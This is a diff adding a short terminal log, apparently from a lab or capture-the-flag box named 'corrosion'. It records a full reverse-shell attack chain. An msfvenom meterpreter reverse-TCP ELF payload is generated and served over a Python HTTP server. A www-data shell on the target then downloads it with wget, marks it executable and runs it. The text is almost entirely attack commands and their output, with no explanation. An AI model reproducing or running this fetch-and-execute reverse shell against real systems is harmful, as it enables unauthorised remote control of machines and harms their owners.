@@ -1,0 +1,19 @@
+└─$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.52 LPORT=9001 -f elf -o reverse.elf
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 130 bytes
+Final size of elf file: 250 bytes
+Saved as: reverse.elf
+
+└─$ python -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+
+--- on target ---
+www-data@corrosion:/tmp$ wget http://10.0.0.52/reverse.elf
+--2026-06-05 12:14:29--  http://10.0.0.52/reverse.elf
+Length: 250 [application/octet-stream]
+Saving to: 'reverse.elf'
+100% 29.5M=0s
+www-data@corrosion:/tmp$ chmod +x reverse.elf
+www-data@corrosion:/tmp$ ./reverse.elf
